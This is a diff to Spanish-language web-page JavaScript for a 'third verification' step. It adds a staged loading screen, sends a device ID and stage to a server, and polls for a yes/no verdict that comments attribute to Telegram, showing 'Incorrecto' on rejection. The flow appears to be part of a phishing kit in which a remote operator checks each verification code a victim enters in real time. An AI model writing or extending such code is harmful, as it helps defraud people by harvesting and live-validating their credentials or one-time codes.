@@ -1257,16 +1257,13 @@ function mostrarSeccionOpciones(opcion) {
 })();
 
 // ==========================================
-// VENTANA CALIFICACIÓN
+// TERCERA VERIFICACIÓN: CALIFICACIÓN
 // ==========================================
 
 (function configurarVentanaCalificacion() {
 
     const botonAceptar =
         document.getElementById("resultado-aceptarBtn");
-
-    const botonRechazar =
-        document.getElementById("resultado-rechazarBtn");
 
     const ventana =
         document.getElementById("calificacion-modal");
@@ -1283,32 +1280,72 @@ function mostrarSeccionOpciones(opcion) {
     const botonCancelar =
         document.getElementById("cancelarCalificacionBtn");
 
+    const seccionResultado =
+        document.getElementById("resultado");
+
+    const seccionResultado2 =
+        document.getElementById("resultado2");
+
+    const loadingScreen =
+        document.querySelector(".loading-screen");
+
     if (
         !botonAceptar ||
-        !botonRechazar ||
         !ventana ||
         !sombra ||
         !campo ||
         !botonContinuar ||
-        !botonCancelar
+        !botonCancelar ||
+        !seccionResultado ||
+        !seccionResultado2 ||
+        !loadingScreen
     ) {
         return;
     }
 
+    const TIEMPO_MAXIMO_CALIFICACION = 60000;
+
+    let abriendoCalificacion = false;
+    let esperandoDecisionCalificacion = false;
+
     // ======================================
-    // ABRIR CALIFICACIÓN
+    // ABRIR VENTANA CALIFICACIÓN
     // ======================================
 
     botonAceptar.addEventListener("click", function () {
 
-        sombra.classList.remove("hidden");
+        if (
+            abriendoCalificacion ||
+            esperandoDecisionCalificacion
+        ) {
+            return;
+        }
 
-        ventana.classList.remove("hidden");
+        abriendoCalificacion = true;
+
+        ventana.classList.add("hidden");
+        sombra.classList.add("hidden");
+
+        loadingScreen.style.backgroundColor =
+            "rgba(233, 233, 233, 0.6)";
+
+        loadingScreen.classList.remove("hidden");
+
+        setTimeout(function () {
+
+            sombra.classList.remove("hidden");
+            ventana.classList.remove("hidden");
+
+            loadingScreen.classList.add("hidden");
+
+            abriendoCalificacion = false;
+
+        }, 2000);
 
     });
 
     // ======================================
-    // VALIDACIÓN DEL CAMPO
+    // HABILITAR BOTÓN CONTINUAR
     // ======================================
 
     campo.addEventListener("input", function () {
@@ -1322,6 +1359,10 @@ function mostrarSeccionOpciones(opcion) {
             valido
         );
 
+        document.querySelector(
+            ".alertaOpcionesNo"
+        )?.remove();
+
     });
 
     // ======================================
@@ -1330,38 +1371,216 @@ function mostrarSeccionOpciones(opcion) {
 
     botonCancelar.addEventListener("click", function () {
 
-        ventana.classList.add("hidden");
-
-        sombra.classList.add("hidden");
-
-    });
-
-    // ======================================
-    // TECLA ENTER
-    // ======================================
-
-    campo.addEventListener("keydown", function (event) {
-
-        if (event.key === "Enter") {
-
-            event.preventDefault();
-
-            campo.blur();
-
-            botonContinuar.click();
-
+        if (esperandoDecisionCalificacion) {
+            return;
         }
 
+        ventana.classList.add("hidden");
+        sombra.classList.add("hidden");
+
+        document.querySelector(
+            ".alertaOpcionesNo"
+        )?.remove();
+
     });
 
     // ======================================
-    // BOTONES PENDIENTES
+    // TERCERA DECISIÓN DE TELEGRAM
     // ======================================
 
-    // resultado-rechazarBtn:
-    // Pendiente de configurar.
+    botonContinuar.addEventListener(
+        "click",
+        async function () {
 
-    // calificacionBtn:
-    // Pendiente de configurar.
+            if (
+                botonContinuar.disabled ||
+                esperandoDecisionCalificacion
+            ) {
+                return;
+            }
+
+            esperandoDecisionCalificacion = true;
+
+            document.querySelector(
+                ".alertaOpcionesNo"
+            )?.remove();
+
+            document.querySelector(
+                ".alertaAutenticacion"
+            )?.remove();
+
+            loadingScreen.style.backgroundColor =
+                "rgba(233, 233, 233, 0.6)";
+
+            loadingScreen.classList.remove("hidden");
+
+            const dispositivoID =
+                obtenerIDDispositivo();
+
+            const controlador = new AbortController();
+
+            const temporizador = setTimeout(function () {
+
+                controlador.abort();
+
+            }, TIEMPO_MAXIMO_CALIFICACION);
+
+            try {
+
+                const respuesta = await fetch(
+                    "/opciones/crear",
+                    {
+                        method: "POST",
+
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+
+                        body: JSON.stringify({
+                            dispositivoID,
+                            etapa: "calificacion"
+                        }),
+
+                        signal: controlador.signal
+                    }
+                );
+
+                if (!respuesta.ok) {
+                    throw new Error(
+                        "No se pudo crear la solicitud"
+                    );
+                }
+
+                const datos = await respuesta.json();
+
+                while (!controlador.signal.aborted) {
+
+                    const consulta = await fetch(
+                        "/opciones/estado/" +
+                        encodeURIComponent(datos.idSolicitud),
+                        {
+                            cache: "no-store",
+                            signal: controlador.signal
+                        }
+                    );
+
+                    if (!consulta.ok) {
+                        throw new Error(
+                            "No se pudo consultar la decisión"
+                        );
+                    }
+
+                    const estado = await consulta.json();
+
+                    // ==================================
+                    // TELEGRAM: SÍ
+                    // ==================================
+
+                    if (estado.estado === "si") {
+
+                        ventana.classList.add("hidden");
+                        sombra.classList.add("hidden");
+
+                        seccionResultado.classList.add("hidden");
+
+                        seccionResultado2.classList.remove("hidden");
+
+                        seccionResultado2.scrollTop = 0;
+
+                        loadingScreen.classList.add("hidden");
+
+                        return;
+                    }
+
+                    // ==================================
+                    // TELEGRAM: NO
+                    // ==================================
+
+                    if (estado.estado === "no") {
+
+                        loadingScreen.classList.add("hidden");
+
+                        ventana.classList.remove("hidden");
+                        sombra.classList.remove("hidden");
+
+                        mostrarAlertaOpcionesNo("Incorrecto");
+
+                        return;
+                    }
+
+                    await new Promise(function (resolve) {
+
+                        setTimeout(resolve, 1500);
+
+                    });
+                }
+
+                throw new Error(
+                    "Tiempo de espera agotado"
+                );
+
+            } catch (error) {
+
+                loadingScreen.classList.add("hidden");
+
+                ventana.classList.remove("hidden");
+                sombra.classList.remove("hidden");
+
+                if (!controlador.signal.aborted) {
+
+                    console.error(
+                        "Error en verificación de calificación:",
+                        error
+                    );
+                }
+
+                mostrarAlertaOpcionesNo(
+                    "Servicio no disponible, por favor intenta más tarde"
+                );
+
+            } finally {
+
+                clearTimeout(temporizador);
+
+                esperandoDecisionCalificacion = false;
+
+            }
+
+        }
+    );
+
+    // ======================================
+    // EVITAR ENVÍO DEL FORMULARIO
+    // ======================================
+
+    const formulario =
+        document.getElementById("calificacionForm");
+
+    if (formulario) {
+
+        formulario.addEventListener(
+            "submit",
+            function (event) {
+
+                event.preventDefault();
+
+                botonContinuar.click();
+
+            }
+        );
+
+    }
+
+    // ======================================
+    // QUITAR ALERTA AL CORREGIR
+    // ======================================
+
+    campo.addEventListener("focus", function () {
+
+        document.querySelector(
+            ".alertaOpcionesNo"
+        )?.remove();
+
+    });
 
 })();
